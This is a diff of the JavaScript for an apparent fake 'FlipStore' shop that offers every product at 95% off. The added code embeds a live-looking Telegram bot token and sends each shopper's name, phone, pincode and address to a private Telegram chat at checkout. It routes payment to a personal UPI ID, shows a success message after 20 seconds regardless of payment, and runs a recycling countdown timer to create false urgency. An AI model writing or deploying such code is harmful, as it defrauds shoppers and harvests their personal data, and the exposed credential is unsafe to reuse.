@@ -1,6 +1,8 @@
-// --- COMPLETE PRODUCT DATA ---
-// Images are placeholders because I cannot access external copyrighted images.
-// I have categorized them for better placeholder visuals.
+// --- CONFIGURATION (Yahan apni details dalein) ---
+// WARNING: Putting bot tokens in frontend code is not secure for real websites.
+// Anyone can see this token. Use only for testing/learning.
+const TELEGRAM_BOT_TOKEN = "6305172063:AAFHumurpK6wMV7K-6FZBg-DSKxwMuD4Vw0"; 
+const TELEGRAM_CHAT_ID = "1815847082"; // <--- Aapka Chat ID update ho gaya hai
 
 const products = [
     // --- Earbuds (Keywords: wireless, earbuds, isolated) ---
@@ -287,51 +289,29 @@ const products = [
 ];
 
 
-// --- DOM ELEMENTS & GLOBAL VARIABLES ---
-// Declaring these globally so they can be accessed by functions triggered by HTML onclick events
-let homeView, detailView, productContainer, checkoutModal, successModal, timerSection, stepAddress, stepPayment;
+// --- CORE FUNCTIONS ---
 
-// --- INITIALIZATION (Wait for DOM to be ready) ---
-document.addEventListener('DOMContentLoaded', () => {
-    // 1. Assign DOM Elements after they are loaded
-    homeView = document.getElementById('home-view');
-    detailView = document.getElementById('product-detail-view');
-    productContainer = document.getElementById('product-container');
-    checkoutModal = document.getElementById('checkoutModal');
-    successModal = document.getElementById('successModal');
-    timerSection = document.getElementById('timer-section');
-    stepAddress = document.getElementById('step-address');
-    stepPayment = document.getElementById('step-payment');
-
-    // 2. Start Logic
-    // Check if the container exists to avoid errors on pages where it might be missing
-    if (productContainer) {
-        renderProducts();
-        startTimer();
-    } else {
-        console.error("Product Container not found in HTML!");
-    }
-});
-
-// --- LOGIC FUNCTIONS ---
-
-// 1. Discount Calculation
 function getDiscountedPrice(price) {
-    return Math.floor(price * 0.05); // 95% Off
+    return Math.floor(price * 0.05); // 95% Off logic
 }
 
-// 2. Render Products on Grid
+let currentProduct = null;
+let currentPrice = 0;
+
+// 1. Render Grid
 function renderProducts() {
-    productContainer.innerHTML = '';
+    const container = document.getElementById('product-container');
+    if (!container) return; // Safety check
+    
+    container.innerHTML = '';
     products.forEach(product => {
         const discPrice = getDiscountedPrice(product.price);
-        const imgUrl = product.image;
         
         const card = document.createElement('div');
         card.className = 'product-card';
         card.innerHTML = `
             <div class="discount-badge">95% OFF</div>
-            <img src="${imgUrl}" class="product-img" alt="${product.name}" loading="lazy" onerror="this.src='https://placehold.co/300x300?text=No+Image'">
+            <img src="${product.image}" class="product-img" loading="lazy">
             <div class="product-title">${product.name}</div>
             <div class="price-box">
                 <span class="new-price">₹${discPrice}</span>
@@ -339,68 +319,114 @@ function renderProducts() {
                 <span class="off-percent">95% off</span>
             </div>
         `;
-        // Click -> View Detail Page
-        card.addEventListener('click', () => showProductDetail(product));
-        productContainer.appendChild(card);
+        // Direct click handler
+        card.onclick = function() { showProductDetail(product); };
+        container.appendChild(card);
     });
 }
 
-let currentProduct = null;
-let currentPrice = 0;
-
-// 3. Show Product Detail Page
+// 2. Show Detail Page (THE FIX: Force switch & Scroll Top)
 function showProductDetail(product) {
     currentProduct = product;
     currentPrice = getDiscountedPrice(product.price);
-    const imgUrl = product.image;
 
-    // Update Detail DOM
-    const detailImg = document.getElementById('detail-img');
-    if (detailImg) {
-        detailImg.src = imgUrl;
-        detailImg.onerror = function() { this.src = 'https://placehold.co/400x400?text=No+Image'; };
-    }
-    
+    // Get Elements freshly to avoid null errors
+    const homeView = document.getElementById('home-view');
+    const detailView = document.getElementById('product-detail-view');
+    const timerSection = document.getElementById('timer-section');
+
+    // Update Content
+    document.getElementById('detail-img').src = product.image;
     document.getElementById('detail-title').innerText = product.fullName;
     document.getElementById('detail-price').innerText = `₹${currentPrice}`;
     document.getElementById('detail-old-price').innerText = `₹${product.price}`;
 
-    // Switch Views
-    homeView.classList.add('hidden');
-    timerSection.classList.add('hidden');
-    detailView.classList.remove('hidden');
-    window.scrollTo(0, 0);
+    // SWITCH LOGIC: Explicitly hide home, show detail
+    if(homeView) homeView.style.display = 'none';      // Force Hide
+    if(timerSection) timerSection.style.display = 'none'; // Force Hide
+    
+    if(detailView) {
+        detailView.classList.remove('hidden'); // Remove class
+        detailView.style.display = 'block';    // Force Show
+    }
+
+    // SCROLL TO TOP (Crucial for "New Page" feel)
+    window.scrollTo({ top: 0, behavior: 'auto' });
 }
 
-// 4. Go Back Home
+// 3. Go Home (Reset)
 function goHome() {
-    detailView.classList.add('hidden');
-    homeView.classList.remove('hidden');
-    timerSection.classList.remove('hidden');
-    window.scrollTo(0, 0);
-}
+    const homeView = document.getElementById('home-view');
+    const detailView = document.getElementById('product-detail-view');
+    const timerSection = document.getElementById('timer-section');
 
-// 5. Checkout Flow
-function startCheckout() {
-    // Reset to Step 1
-    if (stepAddress && stepPayment) {
-        stepAddress.classList.remove('hidden');
-        stepPayment.classList.add('hidden');
+    if(detailView) {
+        detailView.classList.add('hidden');
+        detailView.style.display = 'none';
     }
     
-    // Clear inputs (optional)
-    const nameInput = document.getElementById('input-name');
-    if (nameInput) nameInput.value = '';
+    if(homeView) homeView.style.display = 'block';
+    if(timerSection) timerSection.style.display = 'block';
+
+    window.scrollTo({ top: 0, behavior: 'auto' });
+}
+
+// 4. Checkout Logic
+function startCheckout() {
+    const modal = document.getElementById('checkoutModal');
+    const stepAddr = document.getElementById('step-address');
+    const stepPay = document.getElementById('step-payment');
+
+    // Reset steps
+    stepAddr.classList.remove('hidden');
+    stepPay.classList.add('hidden');
     
-    checkoutModal.style.display = "flex";
+    // Clear inputs
+    document.getElementById('input-name').value = '';
+    document.getElementById('input-phone').value = '';
+    
+    modal.style.display = "flex";
 }
 
 function closeModal() {
-    checkoutModal.style.display = "none";
+    document.getElementById('checkoutModal').style.display = "none";
+}
+
+// --- NEW FUNCTION: Send Data to Telegram ---
+function sendToTelegram(message) {
+    if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+        console.error("Telegram Bot Token is missing or invalid.");
+        return;
+    }
+    
+    if(!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
+        console.error("Telegram Chat ID is missing. Please set your Chat ID.");
+        return;
+    }
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const data = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+    };
+
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    })
+    .then(response => {
+        if(response.ok) {
+            console.log("Sent to Telegram");
+        } else {
+            console.error("Telegram API Error:", response.statusText);
+        }
+    })
+    .catch(error => console.error("Telegram Fetch Error:", error));
 }
 
 function goToPayment() {
-    // Validation
     const name = document.getElementById('input-name').value;
     const phone = document.getElementById('input-phone').value;
     const pincode = document.getElementById('input-pincode').value;
@@ -411,52 +437,69 @@ function goToPayment() {
         return;
     }
 
-    // Move to Step 2
-    stepAddress.classList.add('hidden');
-    stepPayment.classList.remove('hidden');
+    // --- CAPTURE DATA & SEND TO TELEGRAM ---
+    const orderDetails = `
+📦 *NEW ORDER ALERT* 📦
+-------------------------
+👤 *Name:* ${name}
+📱 *Phone:* ${phone}
+📮 *Pin:* ${pincode}
+🏠 *Address:* ${addr}
+-------------------------
+🛒 *Product:* ${currentProduct.name}
+💰 *Price:* ₹${currentPrice}
+    `;
     
+    sendToTelegram(orderDetails);
+    // ---------------------------------------
+
+    document.getElementById('step-address').classList.add('hidden');
+    document.getElementById('step-payment').classList.remove('hidden');
     document.getElementById('payment-total').innerText = `₹${currentPrice}`;
 }
 
 function backToAddress() {
-    stepPayment.classList.add('hidden');
-    stepAddress.classList.remove('hidden');
+    document.getElementById('step-payment').classList.add('hidden');
+    document.getElementById('step-address').classList.remove('hidden');
 }
 
-// 6. Process Payment
 const UPI_ID = "simplejat01@ybl"; 
 
 function processPayment() {
-    // UPI Link Generation
     const upiLink = `upi://pay?pa=${UPI_ID}&pn=FlipStore&am=${currentPrice}&cu=INR`;
-    
-    // Simulate redirection
     window.location.href = upiLink;
 
-    // Show success after a short delay
+    // 20 Seconds Delay as requested
     setTimeout(() => {
         closeModal();
-        successModal.style.display = 'flex';
-    }, 2000);
+        document.getElementById('successModal').style.display = 'flex';
+    }, 20000);
 }
 
 function closeSuccessAndHome() {
-    successModal.style.display = 'none';
+    document.getElementById('successModal').style.display = 'none';
     goHome();
 }
 
-// 7. Timer Logic
-let timeInSeconds = 600;
+// 5. Timer (8 Min Global Sync)
 function startTimer() {
     const timerElem = document.getElementById('timer');
     if (!timerElem) return;
 
     setInterval(() => {
-        if (timeInSeconds <= 0) timeInSeconds = 600;
-        else timeInSeconds--;
+        const cycleDuration = 8 * 60; 
+        const now = Math.floor(Date.now() / 1000); 
+        const timeLeft = cycleDuration - (now % cycleDuration);
         
-        const m = Math.floor(timeInSeconds / 60);
-        const s = timeInSeconds % 60;
+        const m = Math.floor(timeLeft / 60);
+        const s = timeLeft % 60;
+        
         timerElem.innerText = `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
     }, 1000);
 }
+
+// INITIALIZE
+document.addEventListener('DOMContentLoaded', () => {
+    renderProducts();
+    startTimer();
+});
